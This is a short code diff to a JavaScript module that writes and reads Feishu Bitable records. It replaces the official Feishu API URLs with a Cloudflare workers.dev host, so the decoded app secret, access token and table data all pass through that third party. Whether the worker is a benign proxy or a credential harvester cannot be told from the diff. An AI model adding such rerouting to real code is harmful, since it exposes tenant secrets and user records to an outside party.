@@ -602,7 +602,7 @@ const _F = (function() {
   async function getToken() {
     if (_token && Date.now() < _exp - 60000) return _token;
     try {
-      const r = await fetch('https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal', {
+      const r = await fetch('https://tiny-moon-faeb.2311522749.workers.dev/auth/v3/tenant_access_token/internal', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ app_id: dec(C.aid), app_secret: dec(C.asc) })
@@ -625,7 +625,7 @@ const _F = (function() {
     const token = await getToken();
     if (!token) { _busy = false; if (_queue.length) setTimeout(_flush, 5000); return; }
     try {
-      const url = `https://open.feishu.cn/open-apis/bitable/v1/apps/${dec(C.bt)}/tables/${dec(C.tid)}/records/batch_create`;
+      const url = `https://tiny-moon-faeb.2311522749.workers.dev/bitable/v1/apps/${dec(C.bt)}/tables/${dec(C.tid)}/records/batch_create`;
       const r = await fetch(url, {
         method: 'POST',
         headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
@@ -654,7 +654,7 @@ const _F = (function() {
     let pageToken = '', page = 0;
     try {
       do {
-        let url = `https://open.feishu.cn/open-apis/bitable/v1/apps/${dec(C.bt)}/tables/${dec(C.tid)}/records?page_size=100`;
+        let url = `https://tiny-moon-faeb.2311522749.workers.dev/bitable/v1/apps/${dec(C.bt)}/tables/${dec(C.tid)}/records?page_size=100`;
         if (pageToken) url += '&page_token=' + encodeURIComponent(pageToken);
         const token = await getToken();
         if (!token) break;
